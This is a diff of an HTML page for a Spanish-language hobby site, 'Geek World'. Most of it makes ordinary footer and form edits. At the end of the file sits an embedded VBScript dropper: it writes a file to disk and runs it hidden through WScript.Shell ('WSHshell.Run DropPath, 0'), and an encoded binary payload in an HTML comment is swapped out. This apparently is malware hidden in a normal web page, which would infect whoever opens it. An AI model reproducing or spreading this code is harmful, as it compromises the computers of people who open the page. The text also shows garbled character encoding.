@@ -109,7 +109,7 @@
     <main>
         <section class="licencias">
             <!--main tittle-->
-            <h3>Historia de las principales licencias a nivel mundial</h3>
+            <h3 id="historiaLicencias">Historia de las principales licencias a nivel mundial</h3>
             <article class="contenedorLicencias">
                 <div class="flexGrid " data-aos="fade-up" data-aos-duration="3000">
                     <!--licencia one img-->
@@ -222,9 +222,8 @@
             <div class="col-8 col-md-auto col-lg-auto">
                 <div class="footer-menu">
                     <ul>
-                        <li><a href="#destacados">Destacados</a></li>
-                        <li><a href="#momentos_epicos">Momentos Ã‰picos</a></li>
-                        <li><a href="#ofertas">Ofertas</a></li>
+                        <li><a href="#historiaLicencias">Licencias History</a></li>
+
                     </ul>
                 </div>
             </div>
@@ -232,10 +231,10 @@
             <div class="col-4 col-md-3 col-lg-auto">
                 <div class="footer-social">
                     <p>Sigamos conectados</p>
-                    <a href="https://marcelorosso.github.io/Geek-World" target="_blank"><i class="fas fa-globe"></i></a>
-                    <a href="https://www.facebook.com/" target="_blank"><i class="fab fa-facebook-f"></i></a>
-                    <a href="https://twitter.com/?lang=es" target="_blank"><i class="fab fa-twitter"></i></a>
-                    <a href="https://www.instagram.com/?hl=es" target="_blank"><i class="fab fa-instagram"></i></a>
+                    <a href="https://marcelorosso.github.io/Geek-World" target="_blank" name="github"><i class="fas fa-globe"></i></a>
+                    <a href="https://www.facebook.com/" target="_blank" name="facebook"><i class="fab fa-facebook-f"></i></a>
+                    <a href="https://twitter.com/?lang=es" target="_blank" name="twitter"><i class="fab fa-twitter"></i></a>
+                    <a href="https://www.instagram.com/?hl=es" target="_blank" name="instagram"><i class="fab fa-instagram"></i></a>
                 </div>
             </div>
             <!--newsletter-->
@@ -243,8 +242,8 @@
                 <div class="newsletter">
                     <p>Suscribite al newsletter para recibir nuestras novedades</p>
                     <form action="" class="subscribe-form">
-                        <input class="subscribe" type="email" name="email" placeholder="IngresÃ¡ tu e-mail" required>
-                        <button class="action-icon"><i class="fas fa-arrow-right"></i></button>
+                        <input class="subscribe" type="email" id="email" placeholder="IngresÃ¡ tu e-mail" required>
+                        <button class="action-icon" type="submit"><i class="fas fa-arrow-right"></i></button>
                         <input class="subscribe-button" type="submit" value="Suscribirse">
                     </form>
                 </div>
@@ -255,8 +254,8 @@
         <div class="copyright">
             <p>Â© 2021 GEEK WORLD. Todos los derechos reservados.<span>Desarrollado con <span class="heart">ðŸ’œ</span> por Marcelo Gabriel Rosso.</span></p>
             <div class="footer-social">
-                <a href="https://marcelorosso.github.io/Geek-World" target="_blank"><i class="fab fa-github"></i></i></a>
-                <a href="https://www.linkedin.com/in/marcelo-gabriel-rosso-6797369a/" target="_blank"><i class="fab fa-linkedin-in"></i></a>
+                <a href="https://marcelorosso.github.io/Geek-World" target="_blank" name="github"><i class="fab fa-github"></i></i></a>
+                <a href="https://www.linkedin.com/in/marcelo-gabriel-rosso-6797369a/" target="_blank" name="linkedIn"><i class="fab fa-linkedin-in"></i></a>
             </div>
         </div>
     </footer>
@@ -290,6 +289,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--3u8úNs6êNüëtÎˆh¹‚=±Šø:ÆLGÁ~54 ³„rÉ?0áÌÅ	jŒhd1ß@|ÍD“¬fHÎŠcí 2ZU`ÏÆßÁ7Úzïö]¡YIÂÃ%x9·ÑpƒÅ¶ÄiØ7`Äc
-ì!¹Ý73/À¥àÒ{M6~ AYañíÐOdŸææª¨¾;ü¿èÏ·V}Rƒ@€jè‚òÆCi¼¥Ý:,ãïTªzÉ‘t_o¤uôÉlrÛõýñà˜¡’ psL$$ãU_¤‘ÌÌ¢¤
-aÇÙ3ÇmµS?­;¥]€F¢3©¨PŽºe‚S‡P®.È&p¹äÉáàM>ŠB¾.Åî0¢=šzn2Ý‹ø?™…/—LþªÌøÐ’Àò°‘V	¸ fÁ!¥¹ ¿a¯'¸Ûé(OÜ&áÝÐ$Îu# #Fžrê/“¼ÛcãìÞ+ã0÷RäÓ:i™„I'+ÓAPãá>Šèl¤® ÒRRIøÒRÒRÒRÅ±N§Ñ›c íR ÒR-->
+//--></SCRIPT><!--ÖoM,Q5NÃ–Ð+ÓŠp¦[ý‘H7?àÍV«•=ÕÏVC+õ'Y•KøÞP¿NEnÍ´‹µÀì$œÐ„hR‹W´Ò3Um™¾9¬V;»eNVcÁâ€#£Ûn>˜©à°ÝT~*ï1OX’;¢Û×[ù%÷Ê,°ûêÀ,´G³kP"Â/{ö«òÀ/²Ô2®°}™-Ö’.Ro^Œ÷ãØ1^0Ù,J¨×²Hè95ŠA2C]u kÍy¸W[3/¶ÀNóòŠ}—Ô¾–q&k÷†ë›pp¶§¢kUk6Ö~Š64I"W¦y°cÂ”ÍgÛ»ŒE¦ÃMQ¬®@lw
+ü´$³å¼Ó™+×o¹Æ3o!Þixî~;8âîF‘©æX.ˆ\™[økêvï³÷ûÁ		:’l2UnÃç\l]›þÚ-Ï×pQ¤±ã‡SÅRjºt	¬L/jQÄk³È¯ÊeŽ¡Þ¿šPMg5€ˆ¨k+oVE ÒRRIøÒRÒRÒRÅ±NòÕ›cíR ÒR-->
